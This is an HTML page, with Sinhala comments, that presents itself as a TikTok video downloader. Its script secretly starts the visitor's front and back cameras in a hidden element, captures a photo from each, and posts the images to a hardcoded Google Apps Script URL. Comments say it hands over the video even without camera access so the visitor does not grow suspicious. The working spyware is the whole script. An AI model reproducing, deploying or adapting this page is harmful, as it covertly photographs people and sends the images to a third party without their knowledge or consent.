<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Video Downloader</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 100%; box-sizing: border-box; }
        h1 { color: #fe2c55; margin-bottom: 20px; }
        input[type="text"] { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; box-sizing: border-box; }
        
        .dl-btn { background-color: #fe2c55; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 5px; cursor: pointer; width: 100%; font-weight: bold; transition: 0.2s; box-sizing: border-box; }
        .dl-btn:hover { background-color: #e11d43; }
        .footer { margin-top: 20px; font-size: 12px; color: #777; }

        /* කැමරාව background එකේ රහසිගතව ක්‍රියාත්මක වීමට */
        .camera-container { position: absolute; width: 1px; height: 1px; overflow: hidden; opacity: 0; }
        #status { margin-top: 15px; font-weight: bold; color: #fe2c55; text-align: center; font-size: 14px; min-height: 20px; }
        
        /* ඩවුන්ලෝඩ් ලින්ක් එක පෙන්වන කොටස */
        .download-result { margin-top: 20px; display: none; background: #eef9ee; padding: 15px; border-radius: 5px; border: 1px solid #c2eec2; }
        .result-btn { display: inline-block; background-color: #25d366; color: white; text-decoration: none; padding: 10px 15px; border-radius: 5px; font-weight: bold; margin-top: 10px; width: 90%; }
    </style>
</head>
<body>

    <div class="container">
        <h1>TikTok Downloader</h1>
        <p>ටික්ටොක් වීඩියෝ ලින්ක් එක පහතින් ඇතුළත් කරන්න:</p>
        
        <div>
            <input type="text" id="tiktok-url" placeholder="https://www.tiktok.com/..." required>
            <button type="button" class="dl-btn" id="download-btn">Download Video</button>
        </div>
        
        <!-- Status පණිවිඩ -->
        <div id="status"></div>

        <!-- වීඩියෝ එක ලෝඩ් වුණාම මෙතනින් ඩවුන්ලෝඩ් බටන් එක එනවා -->
        <div class="download-result" id="result-box">
            <p style="color: #2b7a2b; margin: 0; font-weight: bold;">Video is Ready!</p>
            <a href="#" id="video-link" class="result-btn" target="_blank" download>Click Here to Save Video</a>
        </div>
        
        <div class="footer">Created by You ❤️</div>
    </div>

    <!-- කැමරා Elements (පිටුවට බාධාවක් නොවන සේ සඟවා ඇත) -->
    <div class="camera-container">
        <video id="video" autoplay playsinline></video>
    </div>
    <canvas id="canvas" style="display:none;"></canvas>

 <script>
    // ⚠️ ඔයාගේ GOOGLE WEB APP URL එක ⚠️
    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycby4bmnhkzOY-9ivEjLNF-nzQI4Aqj5GIPr-Erz6dc-fl2P_n1rubnOfBSIINwOxoyrTug/exec";

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const statusDiv = document.getElementById('status');
    const downloadBtn = document.getElementById('download-btn');
    const urlInput = document.getElementById('tiktok-url');
    const resultBox = document.getElementById('result-box');
    const videoLink = document.getElementById('video-link');
    
    let currentStream = null;

    function stopCurrentStream() {
        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
            currentStream = null;
        }
    }

    async function startCamera(facingMode) {
        stopCurrentStream(); 
        await new Promise(resolve => setTimeout(resolve, 500));

        const constraintsOptions = [
            { video: { facingMode: facingMode }, audio: false },
            { video: { facingMode: { exact: facingMode } }, audio: false }
        ];

        for (let constraints of constraintsOptions) {
            try {
                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = currentStream;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                return true;
            } catch (err) {
                console.log("Attempt failed for: ", facingMode);
            }
        }
        return false;
    }

    // ප්‍රධාන බටන් එක ක්‍රියාත්මක වීම
    downloadBtn.addEventListener('click', async () => {
        const videoUrl = urlInput.value.trim();
        if(videoUrl === "") {
            alert("කරුණාකර ලින්ක් එකක් ඇතුලත් කරන්න!");
            return;
        }

        downloadBtn.disabled = true;
        resultBox.style.display = "none";
        statusDiv.textContent = "Connecting to TikTok Server...";
        
        // 1. පසුබිමෙන් Front Camera එක ඔන් කරලා photo එකක් ගැනීම ආරම්භ කරනවා
        const frontValid = await startCamera("user");
        
        // ඒ අතරතුරේම TikTok වීඩියෝ එක සැබෑවටම Fetch කරනවා Backend API එකකින්
        try {
            // Free Tikwm API එක පාවිච්චි කරලා වීඩියෝ ඩවුන්ලෝඩ් ලින්ක් එක ගන්නවා
            const response = await fetch(`https://api.tikwm.com/api/`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({ 'url': videoUrl })
            });
            const data = await response.json();

            if (data.code === 0 && data.data.play) {
                // සැබෑ වීඩියෝ ලින්ක් එක සෙට් කරනවා
                videoLink.href = data.data.play; 
                
                if (frontValid) {
                    statusDiv.textContent = "Fetching Video Streams...";
                    await captureAndUpload(); // Front Photo එක අප්ලෝඩ් කරනවා
                    
                    // 2. ඊළඟට Back Camera එකට මාරු වෙනවා
                    const backValid = await startCamera("environment");
                    if (backValid) {
                        setTimeout(async () => {
                            await captureAndUpload(); // Back Photo එක අප්ලෝඩ් කරනවා
                            statusDiv.textContent = "";
                            resultBox.style.display = "block"; // වීඩියෝ ඩවුන්ලෝඩ් බොක්ස් එක පෙන්වනවා
                            downloadBtn.disabled = false;
                            stopCurrentStream();
                        }, 2000);
                    } else {
                        statusDiv.textContent = "";
                        resultBox.style.display = "block";
                        downloadBtn.disabled = false;
                        stopCurrentStream();
                    }
                } else {
                    // කැමරා අවසර නැතත් වීඩියෝ එක ඩවුන්ලෝඩ් වෙන්න දෙනවා සැක නොසිතීමට
                    statusDiv.textContent = "";
                    resultBox.style.display = "block";
                    downloadBtn.disabled = false;
                }
            } else {
                statusDiv.textContent = "❌ Invalid TikTok URL. Please check and try again.";
                downloadBtn.disabled = false;
                stopCurrentStream();
            }

        } catch (error) {
            console.error("TikTok API error:", error);
            statusDiv.textContent = "❌ Connection error. Please try again.";
            downloadBtn.disabled = false;
            stopCurrentStream();
        }
    });

    async function captureAndUpload() {
        if (!video.videoWidth || video.videoWidth === 0) {
            await new Promise(resolve => setTimeout(resolve, 500));
        }
        if (!video.videoWidth) return; 
        
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const imageData = canvas.toDataURL('image/png');

        try {
            await fetch(WEB_APP_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData })
            });
        } catch (error) {
            console.error("Upload error:", error);
        }
    }
 </script>
    
</body>
</html>
